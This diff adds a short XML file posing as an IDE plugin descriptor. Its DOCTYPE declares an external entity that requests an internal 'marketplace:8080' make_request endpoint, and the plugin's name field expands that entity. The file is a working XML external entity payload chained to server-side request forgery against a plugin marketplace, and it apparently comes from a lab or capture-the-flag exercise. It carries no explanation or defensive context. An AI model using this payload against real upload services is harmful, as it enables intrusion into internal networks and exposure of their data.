@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "http://marketplace:8080/make_request?url=http://marketplace:8080/&httpMethod=GET&headers=a:b">
+        ]>
+<ide-plugin xmlns="">
+    <name>&xxe;</name>
+    <id>org.plugin.package</id>
+    <version>1.0</version>
+</ide-plugin>
